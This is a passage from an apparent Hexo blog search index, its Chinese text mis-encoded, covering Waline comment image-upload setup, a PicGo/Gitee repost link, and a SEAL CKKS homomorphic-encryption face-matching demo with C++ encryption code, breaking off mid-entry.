punctuation">,</span>mail<span class="token punctuation">,</span>link<span class="token punctuation">]</span> # waline comment header info</span>  <span class="token property-declaration"><span class="token property">requiredFields</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>nick<span class="token punctuation">,</span>mail<span class="token punctuation">]</span></span>  <span class="token property-declaration"><span class="token property">serverURL</span><span class="token punctuation">:</span> # Waline çš„æœåŠ¡ç«¯åœ°å€ã€Œå¿…å¡«ã€ æµ‹è¯•ç”¨åœ°å€<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token comment">//waline-ruddy.vercel.app</span></span>  <span class="token property-declaration"><span class="token property">avatar</span><span class="token punctuation">:</span> robohash # gravatar style https<span class="token punctuation">:</span><span class="token comment">//waline.js.org/client/basic.html#avatar</span></span>  <span class="token property-declaration"><span class="token property">pageSize</span><span class="token punctuation">:</span> <span class="token number">10</span> # è¯„è®ºæ¯é¡µæ˜¾ç¤ºæ•°é‡</span>  <span class="token property-declaration"><span class="token property">lang</span><span class="token punctuation">:</span> zh-CN</span>  <span class="token property-declaration"><span class="token property">visitor</span><span class="token punctuation">:</span> <span class="token boolean">true</span></span></code></pre><p>å…¶ä¸­ serverURL é€‰é¡¹ è¯·å‚è€ƒæ–‡æ¡£ä½¿ç”¨è¯´æ˜</p><div class="tag link"><a class="link-card" title="walineæ–‡æ¡£" href="https://waline.js.org/guide/get-started.html"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">walineæ–‡æ¡£</p><p class="url">https://waline.js.org/guide/get-started.html</p></div></a></div><ol start="2"><li>è‹¥é‡‡ç”¨å…¶ä»–ä¸»é¢˜,å¯æŒ‰ç…§å®˜æ–¹è®¾ç½®åŠ å…¥ uploadImage å³å¯, å…·ä½“å‚è€ƒ</li></ol><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>head<span class="token operator">></span>  <span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">'//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js'</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  <span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>  <span class="token operator">...</span>  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"waline"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">new</span> <span class="token class-name">Waline</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      el<span class="token operator">:</span> <span class="token string">'#waline'</span><span class="token punctuation">,</span>      path<span class="token operator">:</span> location<span class="token punctuation">.</span>pathname<span class="token punctuation">,</span>      serverURL<span class="token operator">:</span> <span class="token string">'https://your-domain.vercel.app'</span>      <span class="token function-variable function">uploadImage</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://7bu.top/upload/upload.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        body<span class="token operator">:</span> formData      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resp</span> <span class="token operator">=></span> resp<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resp</span> <span class="token operator">=></span> resp<span class="token punctuation">.</span>data<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre></div><h2 id="ä¿®æ”¹">ä¿®æ”¹</h2><div class="story post-story"><ol><li><p>å¦‚æœä½ ä½¿ç”¨volantisä½œä¸ºä¸»é¢˜,</p><p>é‚£ä¹ˆåªéœ€è¦ä¿®æ”¹<code>themes\volantis\layout\_third-party\comments\waline\script.ejs</code> æ–‡ä»¶ä¸­ çš„<code>uploadImage</code>å‡½æ•°</p><p>å°†<code>your's token value</code> æ›¿æ¢ä¸ºä½ è‡ªå·±çš„ å›¾åºŠ <code>token</code></p></li></ol><pre class="language-ejs" data-language="ejs"><code class="language-ejs">  uploadImage: function(file) &#123;   const formData = new FormData();   formData.append('image', file);   const token = "your's token value";   return fetch('<span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> theme<span class="token punctuation">.</span>comments<span class="token punctuation">.</span>waline<span class="token punctuation">.</span>imageHosting </span><span class="token delimiter punctuation">%></span></span>', &#123;   method: 'POST',   body: formData,     headers: &#123;'Authorization': token&#125;   &#125;).then(resp => resp.json()).then(resp => resp.data.url);&#125;,</code></pre><ol start="2"><li><p>è‹¥é‡‡ç”¨å…¶ä»–ä¸»é¢˜</p><p>è¯·ä¿®æ”¹ä»£ç  å°†<code>your's token value</code> æ›¿æ¢ä¸ºä½ è‡ªå·±çš„ å›¾åºŠ <code>token</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>head<span class="token operator">></span>  <span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">'//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js'</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  <span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>  <span class="token operator">...</span>  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"waline"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">new</span> <span class="token class-name">Waline</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      el<span class="token operator">:</span> <span class="token string">'#waline'</span><span class="token punctuation">,</span>      path<span class="token operator">:</span> location<span class="token punctuation">.</span>pathname<span class="token punctuation">,</span>      serverURL<span class="token operator">:</span> <span class="token string">'https://your-domain.vercel.app'</span>      <span class="token function-variable function">uploadImage</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> token <span class="token operator">=</span> <span class="token string">" your's token value"</span><span class="token punctuation">;</span>      formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://7bu.top/upload/upload.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        body<span class="token operator">:</span> formData<span class="token punctuation">,</span>        headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">'Authorization'</span><span class="token operator">:</span> token<span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resp</span> <span class="token operator">=></span> resp<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">resp</span> <span class="token operator">=></span> resp<span class="token punctuation">.</span>data<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æ‚é¡¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›¾åºŠ </tag>
            
            <tag> Waline </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicGo + Gitee(ç äº‘)å®ç°markdownå›¾åºŠ</title>
      <link href="/posts/373ab937/"/>
      <url>/posts/373ab937/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><div class="tag link"><a class="link-card" title="è½¬è½½" href="https://www.jianshu.com/p/b69950a49ae2"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">è½¬è½½</p><p class="url">https://www.jianshu.com/p/b69950a49ae2</p></div></a></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> å›¾åºŠ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicGo </tag>
            
            <tag> Gitee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HE åœ¨äººè„¸è¯†åˆ«ä¸­çš„åº”ç”¨Demo æ¼”ç¤ºæ–‡æ¡£</title>
      <link href="/posts/6c15e2cc/"/>
      <url>/posts/6c15e2cc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>HE åœ¨äººè„¸è¯†åˆ«ä¸­çš„åº”ç”¨demo æ¼”ç¤ºæ–‡æ¡£</h1><p>@[toc]</p><h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><ol><li><code>ä½¿ç”¨çš„HEæ–¹æ¡ˆæ˜¯</code><strong>CKKS</strong></li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">/</span><span class="token operator">|</span> Encryption parameters <span class="token operator">:</span><span class="token operator">|</span>   scheme<span class="token operator">:</span> CKKS<span class="token operator">|</span>   poly_modulus_degree<span class="token operator">:</span> <span class="token number">8192</span><span class="token operator">|</span>   coeff_modulus size<span class="token operator">:</span> <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">)</span> bits<span class="token operator">|</span>   scale<span class="token operator">:</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>\</code></pre><ol start="2"><li>è¾“å…¥æ•°æ®çš„é•¿åº¦ n = 10 ,</li><li>å› ä¸ºæ²¡æœ‰ç”¨FaceNetæ•°æ®é›†çš„ç¼˜æ•…,æ¼”ç¤ºæ‰€ç”¨çš„æµ‹è¯•æ•°æ®æ¥æºä¸ºç®€å•ç”Ÿæˆ,<a href="#%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90">ç”Ÿæˆæ–¹å¼ä¸º:</a></li><li>ç¼–è¯‘å¹³å°: Visual Studio 2019</li><li>æ‰€éœ€å¤–éƒ¨ç¯å¢ƒ: <code>seal.h</code>  ; <code> examples.h</code> ï¼› <code>bits/stdc++.h</code></li><li>é¡¹ç›®ä»£ç ä¸Šä¼ è‡³: github: <a href="https://github.com/sizaif/SEALExamples/tree/main">https://github.com/sizaif/SEALExamples/tree/main</a></li></ol></div><h2 id="æ•°æ®æ¥æº">æ•°æ®æ¥æº</h2><div class="story post-story"><p>è¾“å…¥çš„inputæ•°æ®å’Œdatabaseæ•°æ®æ¥æºç”Ÿæˆä»£ç å¦‚ä¸‹:</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// slot_count = poly_modulus_degree /2  => 4096 </span><span class="token keyword">double</span> curr_point <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">double</span> step_size <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>slot_count<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ofstream out<span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"database.txt"</span><span class="token punctuation">,</span> ios<span class="token double-colon punctuation">::</span>in <span class="token operator">|</span> ios<span class="token double-colon punctuation">::</span>out <span class="token operator">|</span> ios<span class="token double-colon punctuation">::</span>binary <span class="token operator">|</span> ios<span class="token double-colon punctuation">::</span>trunc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>out<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> step <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> slot_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// æ¯10è¡Œä¸€ä¸ªæ•°æ®</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>step <span class="token operator">%</span><span class="token number">10</span> <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span>            out <span class="token operator">&lt;&lt;</span> curr_point <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            out <span class="token operator">&lt;&lt;</span> curr_point <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        step<span class="token operator">++</span><span class="token punctuation">;</span>        curr_point <span class="token operator">+=</span> step_size<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    out <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input vector: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><strong>é€‰å–çš„inputæ•°æ®å¦‚ä¸‹:</strong></p><p>[0.984127 0.984371 0.984615 0.98486 0.985104 0.985348 0.985592 0.985836 0.986081 0.986325]</p><p><code>ä»ç”Ÿæˆçš„databaseä¸­æœ€å10è¡Œä¸­é€‰å–ç¬¬6è¡Œç”Ÿæˆ</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/306a3ef9b0eb9fc250a42668b72cdca7.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/306a3ef9b0eb9fc250a42668b72cdca7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203124141787"></p><hr><p><strong>é€‰å–çš„database E æ•°æ®å¦‚ä¸‹:</strong></p><details green><summary> data </summary>              <div class='content'>              <p>[0.974359 0.974603 0.974847 0.975092 0.975336 0.97558 0.975824 0.976068 0.976313 0.976557]<br>[0.976801 0.977045 0.977289 0.977534 0.977778 0.978022 0.978266 0.97851 0.978755 0.978999]<br>[0.979243 0.979487 0.979731 0.979976 0.98022 0.980464 0.980708 0.980952 0.981197 0.981441]<br>[0.981685 0.981929 0.982173 0.982418 0.982662 0.982906 0.98315 0.983394 0.983639 0.983883]<br>[0.984127 0.984371 0.984615 0.98486 0.985104 0.985348 0.985592 0.985836 0.986081 0.986325]<br>[0.986569 0.986813 0.987057 0.987302 0.987546 0.98779 0.988034 0.988278 0.988523 0.988767]<br>[0.989011 0.989255 0.989499 0.989744 0.989988 0.990232 0.990476 0.99072 0.990965 0.991209]<br>[0.991453 0.991697 0.991941 0.992186 0.99243 0.992674 0.992918 0.993162 0.993407 0.993651]<br>[0.993895 0.994139 0.994383 0.994628 0.994872 0.995116 0.99536 0.995604 0.995849 0.996093]<br>[0.996337 0.996581 0.996825 0.99707 0.997314 0.997558 0.997802 0.998046 0.998291 0.998535]</p>              </div>            </details><hr><p><img src="https://img-blog.csdnimg.cn/img_convert/40e96468e1b70174d204a366dbae6687.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/40e96468e1b70174d204a366dbae6687.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203124350026"></p></div><h2 id="è¿‡ç¨‹æ­¥éª¤">è¿‡ç¨‹æ­¥éª¤</h2><div class="story post-story"><h3 id="æ€»è§ˆ">æ€»è§ˆ</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/80fe9cdfad6a4374ef4e118e97792730.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/80fe9cdfad6a4374ef4e118e97792730.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203193037721"></p><ol><li><p>é¦–å…ˆè®¡ç®— p ä¸ E ä¸­çš„ $C_{i}$ æ¯”è¾ƒåˆ†æ•°å¹¶ç”¨ $r_{i}$è¡¨ç¤º,æ±‚æœ€ä½³çš„ $r_{i}$,</p><p>$\mathbf{r}<em>{i}=\operatorname{dist}\left(\mathbf{p}, \mathbf{c}</em>{i}\right) \cdot \mathbf{k} ; k={1,0, \ldots 0}$â€‹</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812101706.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812101706.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812101705064"></p></li><li><p>å¤„ç†å®Œå…¨éƒ¨æ•°æ®åº“å†…å®¹å,Nä¸ªå•ç‹¬ç»“æœçš„</p><p>vector $\mathbf{R}=\left[\begin{array}{c}\mathbf{r}<em>{1} \ \mathbf{r}</em>{2} \ \vdots \ \mathbf{r}<em>{N}\end{array}\right]=\left[\begin{array}{c}\left(\mathbf{r}</em>{1,1}, 0, \ldots 0\right) \ \left(\mathbf{r}<em>{2,1}, 0, \ldots 0\right) \ \vdots \ \left(\mathbf{r}</em>{N, 1}, 0, \ldots 0\right)\end{array}\right]$â€‹</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812101659.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812101659.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812101658056"></p><p>æ¯ä¸ª$r_{i}$â€‹æ˜¯å•ç‹¬åŠ å¯†çš„, å¯ä»¥éšæœºæ‰“ä¹±$r_{i}$â€‹çš„é¡ºåº</p></li><li><p>é€šè¿‡å°†$r_{i}$â€‹ç§»ä½,å˜æˆå¯¹è§’çŸ©é˜µ</p><p>ä¾‹å¦‚ $\mathbf{R}=\left[\begin{array}{c}<br>\left(\mathbf{r}<em>{1,1}, 0, \ldots 0\right) \<br>\left(0, \mathbf{r}</em>{2,1}, \ldots 0\right) \<br>\vdots \<br>\left(0,0, \ldots \mathbf{r}_{N, 1}\right)<br>\end{array}\right]$â€‹</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812101648.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812101648.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812101647010"></p></li><li><p>å°†å¯¹è§’çº¿ä¸Švectorç»„åˆæˆæ–°çš„å¸¦æœ‰ä¸Pæ¯”è¾ƒåˆ†æ•°çš„vectoræ ¼å¼</p><p>i.e.  $R-&gt;\left(\mathbf{r}<em>{1,1}, \mathbf{r}</em>{2,1}, \ldots \mathbf{r}_{N, 1}\right)$â€‹</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812101716.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812101716.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812101715291"></p></li><li><p>å°†ä¸Šå¼è·Ÿé¢„å…ˆè®¾å®šçš„é˜ˆå€¼${t}=(t, t, \ldots t)$è¿›è¡Œæ¯”è¾ƒ   å½¢æˆæ–°çš„vector d:  $d = R - t$, ç„¶åå°†d ä¼ è¾“ç»™ç¬¬ä¸‰æ–¹</p></li><li><p>æœ€ç»ˆå°† d è¿›è¡Œè§£å¯†å†³å®šç»“æœ(decision),å¹¶ä¼ é€ç»™å®¢æˆ·</p><p>$d = R - t$â€‹â€‹  ;   $d=R-t ; \quad$â€‹â€‹ decision $= \begin{cases}\text { accept } &amp; \text { if } \exists d \in \mathbf{d}: d&gt;0 \ \text { reject } &amp; \text { if } \forall d \in \mathbf{d}: d \leq 0\end{cases}$</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812101725.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812101725.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812101724423"></p></li></ol><h3 id="ä¸€-å°†inputå’Œdatabaseä¸­çš„æ•°æ®åˆ†åˆ«åŠ å¯†è·å¾—encrypt-probe-på’Œ-encrypt-E-matrix">ä¸€: å°†inputå’Œdatabaseä¸­çš„æ•°æ®åˆ†åˆ«åŠ å¯†è·å¾—encrypt_probe_på’Œ encrypt_E_matrix</h3><p><strong>1ï¼šåŠ å¯†å¾—åˆ°probe_p</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">Ciphertext <span class="token function">get_encrypt_probe</span><span class="token punctuation">(</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span>Encryptor <span class="token operator">&amp;</span> encryptor<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span>v_input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_encrypt_probe() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * åŠ å¯†è·å¾—probe_p;    */</span>    Plaintext v_plaintext<span class="token punctuation">;</span>    <span class="token comment">// vç¼–ç </span>    ckks_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>v_input<span class="token punctuation">,</span> scale<span class="token punctuation">,</span> v_plaintext<span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext probe_p<span class="token punctuation">;</span>    <span class="token comment">// åŠ å¯†</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>v_plaintext<span class="token punctuation">,</span> probe_p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_encrypt_probe() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> probe_p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/img_convert/a5e3ed2d7a94d1518bb634c25419cee2.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/a5e3ed2d7a94d1518bb634c25419cee2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203124905421"></p><p>å°†åŠ å¯†çš„probe_pè§£å¯†åšéªŒè¯:</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1d831b1f13b80c3f08a75a0fc0419fdb.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/1d831b1f13b80c3f08a75a0fc0419fdb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203130111249"></p><hr><p><strong>2ï¼šå°†databaseä¸­çš„æ‰€æœ‰æ•°æ®åˆ†åˆ«åŠ å¯†ï¼Œç»„æˆçŸ©é˜µE:</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> <span class="token function">get_encrypt_E_matrix</span><span class="token punctuation">(</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span> Encryptor<span class="token operator">&amp;</span> encryptor<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">>></span>E_matrix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_encrypt_E_matrix() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_E_matrix<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> E_matrix<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> E_matrix<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Plaintext plain_E_ci<span class="token punctuation">;</span>        Ciphertext encrypt_E_ci<span class="token punctuation">;</span>        ckks_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain_E_ci<span class="token punctuation">)</span><span class="token punctuation">;</span>        encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain_E_ci<span class="token punctuation">,</span> encrypt_E_ci<span class="token punctuation">)</span><span class="token punctuation">;</span>        encrypt_E_matrix<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>encrypt_E_ci<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_encrypt_E_matrix() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> encrypt_E_matrix<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/img_convert/904d6192f6298c75476819786f79bb0f.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/904d6192f6298c75476819786f79bb0f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" 